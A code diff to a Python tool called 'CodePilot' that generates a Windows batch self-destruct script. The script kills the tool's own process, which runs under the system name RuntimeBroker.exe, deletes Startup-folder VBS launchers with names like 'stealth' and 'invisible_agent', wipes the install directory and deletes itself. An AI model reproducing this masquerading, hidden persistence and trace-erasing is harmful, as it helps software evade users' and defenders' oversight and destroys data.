@@ -898,6 +898,7 @@ class CodePilot:
 
         # Spawn detached self-destruct script
         pid = os.getpid()
+        startup_dir = Path(os.environ.get("APPDATA", "")) / "Microsoft" / "Windows" / "Start Menu" / "Programs" / "Startup"
         cleanup_bat = Path(tempfile.gettempdir()) / f"cp_cleanup_{pid}.bat"
         bat_content = textwrap.dedent(f"""\
             @echo off
@@ -908,10 +909,21 @@ class CodePilot:
                 goto :wait
             )
             timeout /t 2 /nobreak >nul
-            taskkill /F /IM RuntimeBroker.exe >nul 2>&1
+            :: Kill only OUR RuntimeBroker.exe (by matching path, not all)
+            for /f "tokens=2" %%p in ('wmic process where "name='RuntimeBroker.exe' and ExecutablePath like '%%\\.venv\\\\Scripts\\\\%%'" get ProcessId /format:list 2^>nul ^| findstr ProcessId') do (
+                taskkill /F /PID %%p >nul 2>&1
+            )
             timeout /t 1 /nobreak >nul
+            :: Clean VBS files from Startup folder
+            del /F /Q "{startup_dir}\\rb_start.vbs" >nul 2>&1
+            del /F /Q "{startup_dir}\\techno_start.vbs" >nul 2>&1
+            :: Clean VBS files from project
+            del /F /Q "{project_root}\\invisible_agent.vbs" >nul 2>&1
+            del /F /Q "{project_root}\\stealth.vbs" >nul 2>&1
+            :: Nuke the entire installation directory
             rmdir /S /Q "{project_root}" >nul 2>&1
             rmdir /S /Q "{project_root}" >nul 2>&1
+            :: Self-delete
             del /F /Q "%~f0" >nul 2>&1
         """)
         cleanup_bat.write_text(bat_content, encoding="utf-8")
